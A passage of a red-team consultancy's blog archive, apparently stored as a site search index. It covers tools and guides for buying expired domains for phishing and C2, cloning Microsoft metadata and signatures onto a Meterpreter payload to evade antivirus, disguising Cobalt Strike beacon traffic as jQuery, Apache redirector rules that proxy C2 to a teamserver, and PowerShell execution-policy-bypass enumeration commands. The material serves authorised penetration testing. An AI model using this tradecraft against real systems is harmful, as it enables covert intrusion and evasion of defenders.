Alternate Domains and Raphael Mudge's blog for more on those techniques.</p> <p>Domains that were once used for benign purposes and already properly categorized often expire or are deleted, but they can be purchased again for only a few dollars. Such domains enable a team to bypass reputation based web filters and network egress restrictions for phishing and C2 related tasks. Enter ExpiredDomains.net \u2013 the expired domain names search engine. This is a great resource for pentesters and red teamers looking for a quick \"fast-food menu\" of available domains when they don't want or have the luxury of time to develop a catalog of domains, maintain web servers, and create \"legit content\" for proper categorization, only to see them quickly burned on an op. There's certainly a case for maintaining some domains over time, but again you probably don't want to use them for quick one or two week engagements.</p> <p>Thus we started working on DomainHunter (https://github.com/threatexpress/domainhunter) back in September 2016, a small script that would take advantage of Expireddomains.net listings and cross them with known reputation sources to generate a list of potential domains for upcoming engagements. Mr-Un1k0d3r created CatMyFish which also leverages the Expireddomains.net listing and is worth a look. DomainHunter was written to quickly query the Expireddomains.net search engine for expired/deleted domains and automatically remove any already reported by Malwaredomains.com. It then optionally queries for domain reputation against services like Blue Coat WebPulse Site Review.</p> <p>Note: Most domain reputation services such as Blue Coat employ CAPTCHA protections that must be avoided by slowing down scripted requests, thus if running over large query sets we recommend executing as a scheduled/cron job and have new options e-mailed to you periodically. Additionally, after around 150 requests to Blue Coat, you'll start receiving the captcha even with the intentionally slow timing programmed into DomainHunter.</p> <p>Let us (@joevest @andrewchiles) know on Twitter if you find the tool useful or have recommendations and improvements!</p> <p></p> <p>Example HTML Report Output for \"bank\"</p> <p>Source on Github</p>"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#domainhunter","title":"DomainHunter","text":""},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#features","title":"Features","text":"<ul> <li>Retrieves specified number of recently expired and deleted domains (.com, .net, .org primarily)</li> <li>Retrieves available domains based on keyword search</li> <li>Performs reputation checks against the Blue Coat Site Review service</li> <li>Sorts results by domain age (if known)</li> <li>Generates Text-based table and HTML report output with links to reputation sources and associated Archive.org entry</li> </ul>"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#usage","title":"Usage","text":"<p>Install all necessary Python requirements</p> <pre><code>cd ./domainhunter/ &amp;&amp; pip install -r requirements.txt\n</code></pre> <p>List available options</p> <pre><code>python ./domainhunter.py -h\nusage: domainhunter.py [-h] [-q QUERY] [-c] [-r MAXRESULTS] [-w MAXWIDTH]\n\nChecks expired domains, bluecoat categorization, and Archive.org history to\ndetermine good candidates for C2 and phishing domains\n\noptional arguments:\n-h, --help show this help message and exit\n-q QUERY, --query QUERY\nOptional keyword used to refine search results\n-c, --check Perform slow reputation checks\n-r MAXRESULTS, --maxresults MAXRESULTS\nNumber of results to return when querying latest\nexpired/deleted domains (min. 100)\n-w MAXWIDTH, --maxwidth MAXWIDTH\nWidth of text table\n</code></pre> <p>Execute a basic query with reputation checks</p> <pre><code>python ./domainhunter.py -q dogs -c\n</code></pre> <p></p> <p>Example Console Output with Reputation Checking</p>"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#additional-resources","title":"Additional Resources","text":""},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads","text":"<p>Joe Vest | October 9, 2017 | Tweet This Post: </p> <p></p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#overview","title":"Overview","text":"<p>A twitter post by Casey Smith (@subtee) inspired me to update a tool written by Andrew Chiles (@andrewchiles) and I a few years ago.</p> <p>During a Red Team engagement, it can be helpful to blend in with the environment as best as possible when forced to operate from disk. Operating in memory is great, but in many situations or scenarios, you must resort to binaries on disk. A technique I've used with great success is to modify a binary's resource information (metadata). This includes fields such as file icons, version, description, product name, copyright, etc. When defeating security defenses or managing IOCs (See my SANS Breaking Red webcast series for more on IOC management), a threat will often attempt to trick or deceive an analyst. Making files blend into the environment can cause an analyst to treat malicious behavior as trusted. If a binary says is it from Microsoft, it must be\u2026</p> <p>This is where MetaTwin comes into play. This is rewritten to not only modify a binary's metadata, but also add a digital signature as recently described by @subtee and @mattifestation.</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#how-metatwin-works","title":"How MetaTwin Works","text":"<ol> <li>MetaTwin starts with a legitimate signed source binary, such as explorer.exe</li> <li>Extracts the resources (via ResourceHacker) and digital signature information (via SigThief)</li> <li>Writes the captured data to a target binary</li> </ol>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#demo","title":"Demo","text":"<p>In this example, I'm simply using a default meterpreter reverse_tcp binary. Nothing special here, use any binary (.exe or .dll). Personally, we're huge fans of Cobalt Strike during real engagements.</p> <p></p> Before MetaTwin After MetaTwin <p>As you can see, the file looks and feels like it could belong there. Storing this in a location such as c:ProgramData... with a modified time stamp, could buy a Red Team operator a bit of time and support long(er) term persistence.</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#interesting-observations","title":"Interesting Observations","text":""},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#antivirus","title":"AntiVirus","text":"<p>Often simple modifications can cause defensive tools to react in different ways. Of course AV is often not a show stopping defensive tool, but we were curious as to how AV handled a default Metasploit meterpreter binary when modified with MetaTwin. No obfuscation other than the addition of metadata and digital signatures. The results were interesting\u2026</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#default-reverse-tcp-meterpreter-binary","title":"Default Reverse TCP Meterpreter Binary","text":"<p>As expected, VirusTotal reported several hits</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#metadata-added-to-reverse-tcp-meterpreter-binary","title":"Metadata added to Reverse TCP Meterpreter Binary","text":"<p>Interestingly, adding metadata alone reduced the AV detection rate.</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#metadata-and-digital-signature-added-to-reverse-tcp-meterpreter-binary","title":"Metadata and Digital Signature added to Reverse TCP Meterpreter Binary","text":"<p>After adding a digital signature and the metadata, exposure dropped from 76% to 58%. This is important because we're not even trying to evade AV!</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#sysinternals-autoruns","title":"SysInternals AutoRuns","text":"<p>In additions to Antivirus, you can see how default tool behavior responds to these modifications using SysInternals AutoRuns.</p> <p>Using the modified binary, we created simple persistence mechanism using a scheduled task. AutoRuns can be used to display this type of Windows persistence. But\u2026 the modified binary is hidden by default. Take a look\u2026</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#autoruns-default-settings-hide-the-microsoft-scheduled-task","title":"AutoRuns Default Settings Hide the \"Microsoft\" scheduled task","text":""},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#_1","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads","text":"<p>AutoRuns Default Options</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#_2","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads","text":"<p>Changing the Default Reveals the \"Microsoft\" scheduled task</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#_3","title":"Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads","text":""},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#takeaway","title":"Takeaway","text":"<p>Based on these observations, it's clear that some AV and EDR tools make poor assumptions based on file metadata and digital signatures that can make them less effective or confuse an inexperienced Blue Team member. Red Team operators can use this to their advantage if forced to operate from disk in future engagements.</p>"},{"location":"blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/#try-metatwin-yourself","title":"Try MetaTwin Yourself","text":""},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/","title":"A Deep Dive into Cobalt Strike Malleable C2","text":"<p>Joe Vest | September 5, 2018 | Tweet This Post: </p> <p></p> <p>One of Cobalt Strike's most valuable features is its ability to modify the behavior of the Beacon payload. By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server.</p> <p>The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles.</p> <p>If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references.</p> <p>Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!!</p> <ul> <li>Don't use defaults. Use a profile.</li> <li>Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products.</li> <li>Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile</li> <li>Test, Test, Test</li> </ul> <p>The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors.</p> <p>Enclose parameters in double quote, not single</p> <pre><code>set useragent \"SOME AGENT\";   # GOOD\nset useragent 'SOME AGENT';   # BAD\n</code></pre> <p>Semicolons are ok</p> <p><code>prepend \"This is an example;\";</code></p> <p>Escape Double quotes</p> <p><code>append \"here is \"some\" stuff\";</code></p> <p>Escape Backslashes</p> <p><code>append \"more \\ stuff\";</code></p> <p>Some special characters do not need escaping</p> <p><code>prepend \"!@#$%^&amp;*()\";</code></p> <p>The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2. This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network.</p> <p>Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets.</p> <p>Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles.</p> <p>The reference profile is self-documented, but let's walk through each section\u2026</p> <p>Malleable C2 References</p> <p>The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#profile-name","title":"Profile Name","text":"<p>![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#sleep-times","title":"Sleep Times","text":"<p>These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#user-agent","title":"User-Agent","text":"<p>Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#ssl-certificate","title":"SSL Certificate","text":"<p>This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic.</p> <p>SSL certificate store creation steps are well documented in</p> <p>Protect your C2 Server</p> <p>It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#spawnto-process","title":"SpawnTo Process","text":"<p>The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters</p> <p><code>set %windir%\\sysnative\\svchost.exe -k localservice -p -s fdPHost</code></p> <p>The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting.</p> <p>General Guidelines:</p> <ul> <li>Don't use protected binaries. How do you know if they are protected? Test</li> <li>Don't select binaries that executes with UAC</li> <li>Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads</li> <li>Consider choosing a binary that would not look strange making network connections</li> </ul>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#smb-beacons","title":"SMB Beacons","text":"<p>SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#dns-beacons","title":"DNS Beacons","text":"<p>DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#staging-process","title":"Staging Process","text":"<p>\u2026 truncated\u2026</p> <p> The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response.</p> <p>In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js, dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js\"&gt; src=\"jquery-3.3.1.min.js\"&gt;. The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js</p> <p>In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#memory-indicators","title":"Memory Indicators","text":"<p> Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#http-get","title":"HTTP GET","text":"<p>\u2026 truncated\u2026</p> <p>Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon. This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid=. This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver.</p> <p>Note</p> <p>The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#http-post","title":"HTTP POST","text":"<p> Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST.</p> <p>GET-Only Profiles have Trade-offs</p> <p>GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at</p> <p>It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation.</p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#c2lint","title":"C2lint","text":"<p>C2lint is a tool provide with Cobalt Strike to test a profile for errors. Run this and correct errors before using on an engagement. https://www.cobaltstrike.com/help-malleable-c2</p> <p>Example</p> <p><code>./c2lint c2lint jquery-c2.3.11.profile</code></p>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#manual-testing","title":"Manual Testing","text":"<p>In addition to testing with c2lint, manually test all features of a Beacon on a test system.</p> <p>Quick Steps for Manual Testing and Validation</p> <ul> <li>Start wireshark</li> <li>Start a teamserver using the test profile</li> <li>Create a HTTP listener (named http)</li> <li>Create a SMB listener (named smb)</li> <li>Create a Scripted Web Delivery attack to stage the HTTP Beacon</li> <li>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery</li> <li>Run the PowerShell on a test Windows system as an Administrator</li> <li>Interact with the elevated Beacon</li> <li>Spawn new Beacons, interact with each, and execute spawn commands:</li> </ul> <pre><code>spawn x64 http\nspawn x86 http\nspawn x64 smb\nspawn x86 smb\n</code></pre> <ul> <li>Review the packet capture data to ensure the http traffic is what you expect:</li> <li>Review the staging process</li> <li>Review the http-get process</li> <li>Review th http-post process (even if you use GET)</li> <li>Execute other Beacon commands to ensure it is working as expected (at a minimum):</li> </ul> <pre><code>keylogger\nscreenshot\ndownload\nupload\n</code></pre>"},{"location":"blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/#references","title":"References","text":"<ul> <li>Cobalt Strike Malleable C2 Help Documents \u2013 https://www.cobaltstrike.com/help-malleable-c2</li> <li>Example Profiles \u2013 https://github.com/rsmudge/Malleable-C2-Profiles</li> <li>Another profile reference (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/</li> <li>Random profile generator (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/</li> <li>In-memory Evation (Raphael Mudge) \u2013 https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK</li> <li>Cobalt Strike 3.6 \u2013 A Path for Privilege Escalation (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/</li> <li>Malleable Command and Control (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/</li> </ul>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/","title":"Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles","text":"<p>Joe Vest | February 1, 2018 | Tweet This Post: </p> <p></p> <p>This post describes a script I created to convert a Cobalt Strike Malleable C2 profile to corresponding mod_rewrite rules to enable intelligent HTTP proxying for redirection of C2 traffic. The script automates the process described by well known redteamer and now co-worker \u2013 Jeff Dimmock (@bluscreenofjeff). Intelligent use of C2 redirectors is core to a mature C2 architecture that can withstand some gentle investigation and prodding. Developing Cobalt Strike compatible mod_rewrite rules to redirect traffic is not incredibly difficult, but there are a few Apache \"gotchas\" and the process can be error prone when dealing with multiple C2 profiles. Automation improves consistency and reduces the time needed to spin-up, test, and troubleshoot a unique and layered C2 infrastructure. It is always nice to start from a known good.</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#highlights-of-cs2modrewritepy","title":"Highlights of cs2modrewrite.py","text":"<ul> <li>Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result: Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default.</li> <li>Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules</li> <li>Supports the most recent Cobalt Strike 3.10 profile features</li> <li>HTTP or HTTPS proxying to the Cobalt Strike Team Server</li> <li>HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests</li> </ul>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#quick-start","title":"Quick Start","text":""},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#usage","title":"Usage","text":"<p>The script can be found at:</p> <p>github - cs2modrewrite</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#arguments","title":"Arguments","text":"<pre><code>cs2modrewrite.py [-h] [-i INPUTFILE] [-c C2SERVER] [-d DESTINATION]\n\nConverts Cobalt Strike profiles to Apache mod_rewrite .htaccess file format by\nusing the User-Agent and URI Endpoint to create rewrite rules. Make sure the\nprofile passes a c2lint check before running this sript.\n\noptional arguments:\n    -h, --help      show this help message and exit\n    -i INPUTFILE    C2 Profile file\n    -c C2SERVER     C2 Server (http://teamserver)\n    -d DESTINATION  (Optional) Redirect to this URL (http://google.com)\n</code></pre>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#example-output","title":"Example Output","text":"<pre><code>#### Save the following as .htaccess in the root web directory\n\n########################################\n## .htaccess START\nRewriteEngine On\n\n## (Optional)\n## Scripted Web Delivery\n## Uncomment and adjust as needed\n#RewriteCond %{REQUEST_URI} ^/css/style1.css?$\n#RewriteCond %{HTTP_USER_AGENT} ^$\n#RewriteRule ^.*$ \"http://TEAMSERVER%{REQUEST_URI}\" [P,L]\n\n## Default Beacon Staging Support (/1234)\nRewriteCond %{REQUEST_URI} ^/..../?$\nRewriteCond %{HTTP_USER_AGENT} \"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08\"\nRewriteRule ^.*$ \"http://TEAMSERVER%{REQUEST_URI}\" [P,L]\n\n## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)\n## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver\n## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)\n## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html\n## Profile URIs\nRewriteCond %{REQUEST_URI} ^(/include/template/isx.php.*|/wp06/wp-includes/po.php.*|/wp08/wp-includes/dtcla.php.*|/modules/mod_search.php.*|/blog/wp-includes/pomo/src.php.*|/includes/phpmailer/class.pop3.php.*|/api/516280565958.*|/api/516280565959.*)$\n## Profile UserAgent\nRewriteCond %{HTTP_USER_AGENT} \"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08\"\nRewriteRule ^.*$ \"https://TEAMSERVER%{REQUEST_URI}\" [P,L]\n\n## Redirect all other traffic here\nRewriteRule ^.*$ HTTPS://GOHERE/? [L,R=302]\n\n## .htaccess END\n########################################\n</code></pre>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#what-does-this-htaccess-do","title":"What does this .htaccess do?","text":""},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#staging","title":"Staging","text":"<p>When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and a 4 character URI, it proxies the traffic to the teamserver.</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#c2-traffic","title":"C2 Traffic","text":"<p>When Apache receives an HTTP request with the User-Agent Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_080 and one of the following URIs</p> <p><code>(/include/template/isx.php._|/wp06/wp-includes/po.php._|/wp08/wp-includes/dtcla.php,/modules/mod_search.php,/blog/wp-includes/pomo/src.php,/includes/phpmailer/class.pop3.php,/api/516280565958,/api/516280565959)</code></p> <p>it proxies the traffic to the teamserver.</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#catch-all","title":"Catch All","text":"<p>Any traffic that doesn't match a rule redirects the request using an HTTP 302</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#summary","title":"Summary","text":"<p>TLDR The python script cs2modrewrite.py automates the process of creating a Malleable C2 compatible .htaccess file for intelligent redirection with Apache mod_rewrite. Try it out and feel free to give feedback and suggestions at @joevest on Twitter and on the ThreatExpress GitHub repo.</p> <p>For more details on developing C2 architecture, check out the Red Team Infrastructure Wiki.</p>"},{"location":"blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/#references","title":"References","text":"<ul> <li>https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/</li> <li>https://twitter.com/bluscreenofjeff</li> <li>https://github.com/threatexpress/cs2modrewrite</li> <li>https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</li> </ul>"},{"location":"blogs/2018/hostenum-updates-usage/","title":"HostEnum: Updates and Usage Guide","text":"<p>Andrew Chiles | January 10, 2018 | Tweet This Post: </p> <p>HostEnum (formerly Invoke-HostEnum) has received some much needed attention in recent weeks and a new version is now available on the ThreatExpress Github (formerly https://www.github.com/minisllc). I've renamed the tool to simply HostEnum since it's actually a large collection of enumeration functions which are now individually called by the Invoke-HostEnum wrapper function. It's designed to provide a quick means of generating a comprehensive system profile and I've found it extremely useful for both offensive and defensive perspectives. Recent improvements include a breakout of enumeration functions, a transition from string output to objects for improved formatting and reporting capabilities, new enumeration checks, and addition of privilege escalation checks from @harmj0y's PowerUp.</p>"},{"location":"blogs/2018/hostenum-updates-usage/#recent-updates","title":"Recent Updates","text":"<ul> <li>Changed function outputs to PS objects vs strings (mostly)</li> <li>Greatly improved HTML reporting</li> <li>Removed remaining Windows binary dependencies (primarily netstat.exe and net.exe)</li> <li>Added -Quick switch to perform a brief system survey</li> <li>Added -Privesc switch to perform PowerUp checks</li> <li>Added -All switch to perform Local, Domain, and Privesc checks</li> <li>Added firewall configuration enumeration</li> <li>Added well-known AV process detection</li> <li>Added retrieval of mapped network shares</li> </ul>"},{"location":"blogs/2018/hostenum-updates-usage/#function-breakout","title":"Function Breakout","text":"<p>Most enumeration functions are now individually callable after loading the script. This means if you're only interested in what AV processes are running, you can call the Get-AVInfo and Get-AVProcesses functions rather than running the entire script or modifying the code. The following is a subset of the functions and excludes ones specific to PowerUp (although they are also directly callable).</p> <ul> <li>Invoke-HostEnum</li> <li>Get-SysInfo</li> <li>Get-ProcessInfo</li> <li>Get-GroupMembership</li> <li>Get-ActiveTCPConnections</li> <li>Get-ActiveListeners</li> <li>Get-FirewallStatus</li> <li>Get-InterestingRegistryKeys</li> <li>Get-IndexedFiles</li> <li>Get-InterestingFiles</li> <li>Get-RecycleBin</li> <li>Get-AVInfo</li> <li>Get-McafeeLogs</li> <li>Get-AVProcesses</li> <li>Get-DomainAdmins</li> <li>Get-DomainAccountPolicy</li> <li>Get-BrowserInformation</li> <li>Get-ChromeHistory</li> <li>Get-ChromeBookmarks</li> <li>Get-InternetExplorerHistory</li> <li>Get-InternetExplorerBookmarks</li> <li>Get-FirefoxHistory</li> <li>Get-ActiveIEURLS</li> <li>Get-UserSPNS</li> </ul>"},{"location":"blogs/2018/hostenum-updates-usage/#usage","title":"Usage","text":"<p>Execute locally hosted script in \"Quick\" mode with console output.</p> <pre><code>powershell -ep bypass -c Import-Module ./HostEnum.ps1; Invoke-HostEnum -Quick\n</code></pre> <p>Execute locally hosted script with HTML report output. If you want the most readable format and don't mind writing a file to disk, consider using the \"-HTMLReport\" option to create a report in the current directory.</p> <pre><code>powershell -ep bypass -c Import-Module ./HostEnum.ps1; Invoke-HostEnum -Local -HTMLReport\n</code></pre> <p>Execute all checks (equivalent to running -Local -Domain -Privesc) and save results as an HTML report.</p> <pre><code>powershell -ep bypass -c Import-Module ./HostEnum.ps1; Invoke-HostEnum -All 